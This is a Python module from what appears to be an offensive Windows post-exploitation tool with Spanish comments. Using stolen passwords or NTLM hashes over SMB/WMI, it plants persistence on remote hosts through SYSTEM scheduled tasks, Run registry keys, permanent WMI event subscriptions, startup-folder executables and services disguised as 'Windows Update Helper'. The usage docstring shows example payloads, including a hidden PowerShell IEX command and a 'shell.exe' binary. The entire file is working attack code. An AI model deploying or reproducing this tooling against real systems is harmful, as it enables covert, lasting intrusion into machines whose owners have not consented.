# scripts/smb/post/persistence.py
"""
Persistencia remota vía SMB/WMI.

Métodos disponibles:
  - schtask       — tarea programada (schtasks /create)
  - registry      — clave Run/RunOnce en HKLM o HKCU
  - wmi-sub       — suscripción WMI permanente (EventFilter + EventConsumer)
  - startup       — copia payload a carpeta de inicio del sistema
  - service       — crea e instala un servicio Windows

Uso:
  python lobera.py smb -t 10.10.10.5 --script=persistence -u USER -p PASS --method schtask --payload "cmd.exe /c whoami" --name MiTarea
  python lobera.py smb -t 10.10.10.5 --script=persistence -u USER -H :HASH --method registry --payload "C:\\Windows\\Temp\\shell.exe"
  python lobera.py smb -t 10.10.10.5 --script=persistence -u USER -p PASS --method wmi-sub --payload "powershell -w h -c IEX(...)"
  python lobera.py smb -t 10.10.10.5 --script=persistence -u USER -p PASS --method service --payload "C:\\Windows\\Temp\\shell.exe" --name LoberaSvc
  python lobera.py smb -t 10.10.10.5 --script=persistence -u USER -p PASS --method startup --local-file shell.exe
"""

from core.output import console
from core import session_db

import time


# ── Helpers ────────────────────────────────────────────────────────────────────

def _smb_connect(target, user, password, domain, lm_hash, nt_hash):
    from impacket.smbconnection import SMBConnection
    smb = SMBConnection(target, target, timeout=10)
    if nt_hash:
        smb.login(user, '', domain, lm_hash, nt_hash)
    else:
        smb.login(user, password, domain)
    return smb


def _wmi_exec(target, user, password, domain, lm_hash, nt_hash, cmd, wait=2):
    """Ejecuta comando remoto vía WMI y devuelve PID."""
    try:
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
        from impacket.dcerpc.v5.dcom import wmi

        dcom = DCOMConnection(target, user, password if not nt_hash else '',
                              domain, lm_hash, nt_hash, oxidResolver=True)
        iface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,
                                        wmi.IID_IWbemLevel1Login)
        login = wmi.IWbemLevel1Login(iface)
        svc   = login.NTLMLogin('//./root/cimv2', None, None)
        login.RemRelease()

        proc, _ = svc.GetObject('Win32_Process')
        result, pid = proc.Create(f'cmd.exe /c {cmd}', 'C:\\', None)
        if wait:
            time.sleep(wait)
        dcom.disconnect()
        return pid
    except Exception as e:
        console.print(f"  [red]✗ WMI error: {e}[/red]")
        return None


# ── Métodos de persistencia ────────────────────────────────────────────────────

def _schtask(target, user, password, domain, lm_hash, nt_hash,
             payload, name, trigger):
    """Tarea programada vía schtasks."""
    console.print(f"  [bold]Método:[/bold] Tarea programada → {name}")

    triggers = {
        "logon":   "/SC ONLOGON",
        "startup": "/SC ONSTART",
        "hourly":  "/SC HOURLY",
        "daily":   "/SC DAILY /ST 08:00",
    }
    sc = triggers.get(trigger, "/SC ONLOGON")

    cmd = (f'schtasks /Create /TN "{name}" /TR "{payload}" '
           f'{sc} /RU SYSTEM /F')
    pid = _wmi_exec(target, user, password, domain, lm_hash, nt_hash, cmd)
    if pid is not None:
        console.print(f"  [green]✓ Tarea creada: {name}[/green]")
        console.print(f"  [dim]Trigger: {trigger} | Payload: {payload}[/dim]")
        return True
    return False


def _registry(target, user, password, domain, lm_hash, nt_hash,
               payload, name, hive):
    """Clave Run en registro."""
    console.print(f"  [bold]Método:[/bold] Registro Run → {hive}\\...\\Run\\{name}")

    key = (r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
           if hive.upper() == 'HKLM'
           else r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run')

    cmd = f'reg add "{key}" /v "{name}" /t REG_SZ /d "{payload}" /f'
    pid = _wmi_exec(target, user, password, domain, lm_hash, nt_hash, cmd)
    if pid is not None:
        console.print(f"  [green]✓ Clave de registro creada[/green]")
        console.print(f"  [dim]{key}\\{name} = {payload}[/dim]")
        return True
    return False


def _wmi_subscription(target, user, password, domain, lm_hash, nt_hash,
                       payload, name):
    """Suscripción WMI permanente (EventFilter + CommandLineEventConsumer)."""
    console.print(f"  [bold]Método:[/bold] Suscripción WMI → {name}")

    try:
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
        from impacket.dcerpc.v5.dcom import wmi

        dcom = DCOMConnection(target, user, password if not nt_hash else '',
                              domain, lm_hash, nt_hash, oxidResolver=True)
        iface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,
                                        wmi.IID_IWbemLevel1Login)
        login = wmi.IWbemLevel1Login(iface)
        svc   = login.NTLMLogin('//./root/subscription', None, None)
        login.RemRelease()

        # EventFilter — cada 60s
        filter_query = ("SELECT * FROM __InstanceModificationEvent WITHIN 60 "
                        "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'")
        ef_cls, _   = svc.GetObject('__EventFilter')
        ef_inst     = ef_cls.SpawnInstance()
        ef_inst.Name             = name + '_filter'
        ef_inst.QueryLanguage    = 'WQL'
        ef_inst.Query            = filter_query
        ef_inst.EventNamespace   = 'root\\cimv2'
        svc.PutInstance(ef_inst)

        # CommandLineEventConsumer
        ec_cls, _   = svc.GetObject('CommandLineEventConsumer')
        ec_inst     = ec_cls.SpawnInstance()
        ec_inst.Name            = name + '_consumer'
        ec_inst.CommandLineTemplate = payload
        svc.PutInstance(ec_inst)

        # FilterToConsumerBinding
        bind_cls, _ = svc.GetObject('__FilterToConsumerBinding')
        bind_inst   = bind_cls.SpawnInstance()
        bind_inst.Filter   = f'__EventFilter.Name="{name}_filter"'
        bind_inst.Consumer = f'CommandLineEventConsumer.Name="{name}_consumer"'
        svc.PutInstance(bind_inst)

        dcom.disconnect()
        console.print(f"  [green]✓ Suscripción WMI creada: {name}[/green]")
        console.print(f"  [dim]Se ejecutará cada ~60s mientras el sistema esté activo[/dim]")
        return True

    except Exception as e:
        console.print(f"  [red]✗ Error creando suscripción WMI: {e}[/red]")
        console.print(f"  [dim]Requiere privilegios de administrador y WMI accesible[/dim]")
        return False


def _startup_folder(target, user, password, domain, lm_hash, nt_hash,
                    local_file, remote_name):
    """Copia ejecutable a carpeta de inicio del sistema."""
    console.print(f"  [bold]Método:[/bold] Carpeta de inicio → {remote_name}")

    try:
        smb = _smb_connect(target, user, password, domain, lm_hash, nt_hash)

        startup = f'ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\{remote_name}'

        with open(local_file, 'rb') as f:
            data = f.read()

        tree = smb.connectTree('C$')
        fid  = smb.createFile(tree, startup)
        smb.writeFile(tree, fid, data)
        smb.closeFile(tree, fid)
        smb.logoff()

        console.print(f"  [green]✓ Archivo copiado a carpeta de inicio[/green]")
        console.print(f"  [dim]C:\\{startup}[/dim]")
        return True

    except Exception as e:
        console.print(f"  [red]✗ Error: {e}[/red]")
        return False


def _service(target, user, password, domain, lm_hash, nt_hash,
             payload, name):
    """Crea e inicia un servicio Windows."""
    console.print(f"  [bold]Método:[/bold] Servicio Windows → {name}")

    cmds = [
        f'sc create {name} binPath= "{payload}" start= auto',
        f'sc description {name} "Windows Update Helper"',
        f'sc start {name}',
    ]

    ok = True
    for cmd in cmds:
        pid = _wmi_exec(target, user, password, domain, lm_hash, nt_hash,
                        cmd, wait=1)
        if pid is None:
            ok = False
            break

    if ok:
        console.print(f"  [green]✓ Servicio creado e iniciado: {name}[/green]")
        console.print(f"  [dim]Binario: {payload}[/dim]")
    return ok


# ── Script principal ───────────────────────────────────────────────────────────

class Script:
    NAME        = "persistence"
    DESCRIPTION = "Persistencia remota: schtask, registro, WMI, startup, servicio"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        target   = str(self.target.ip)
        user     = getattr(args, 'username', None) or (self.creds.username if self.creds else None)
        password = getattr(args, 'password', '') or (self.creds.password if self.creds else '')
        domain   = getattr(args, 'domain',   '') or (self.creds.domain   if self.creds else '')
        hash_    = getattr(args, 'hash',     None)
        method   = getattr(args, 'method',   'schtask') or 'schtask'
        payload  = getattr(args, 'exec',     None)
        name     = getattr(args, 'persist_name', 'WindowsUpdate')
        hive     = getattr(args, 'hive',     'HKLM')
        trigger  = getattr(args, 'trigger',  'logon')
        local_file = getattr(args, 'local_file', None)

        if not user:
            console.print("[red]Falta -u USER[/red]")
            return

        lm_hash = nt_hash = ''
        if hash_:
            parts   = hash_.split(':')
            lm_hash = parts[0] if len(parts) > 1 else 'aad3b435b51404eeaad3b435b51404ee'
            nt_hash = parts[-1]

        console.print(f"  [bold]Persistencia[/bold] → {target}  método: {method}")

        success = False

        if method == 'schtask':
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            success = _schtask(target, user, password, domain,
                               lm_hash, nt_hash, payload, name, trigger)

        elif method == 'registry':
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            success = _registry(target, user, password, domain,
                                 lm_hash, nt_hash, payload, name, hive)

        elif method == 'wmi-sub':
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            success = _wmi_subscription(target, user, password, domain,
                                         lm_hash, nt_hash, payload, name)

        elif method == 'startup':
            if not local_file:
                console.print("[red]Falta --local-file RUTA[/red]"); return
            remote_name = name + '.exe' if not name.endswith('.exe') else name
            success = _startup_folder(target, user, password, domain,
                                       lm_hash, nt_hash, local_file, remote_name)

        elif method == 'service':
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            success = _service(target, user, password, domain,
                                lm_hash, nt_hash, payload, name)

        else:
            console.print(f"  [yellow]Métodos disponibles:[/yellow] schtask | registry | wmi-sub | startup | service")
            return

        if success:
            session_db.save_finding(
                category="persistence",
                data={
                    "target":  target,
                    "method":  method,
                    "name":    name,
                    "payload": payload or local_file,
                }
            )
            console.print(f"\n  [bold green]✓ Persistencia establecida[/bold green]")
        else:
            console.print(f"\n  [bold red]✗ No se pudo establecer persistencia[/bold red]")
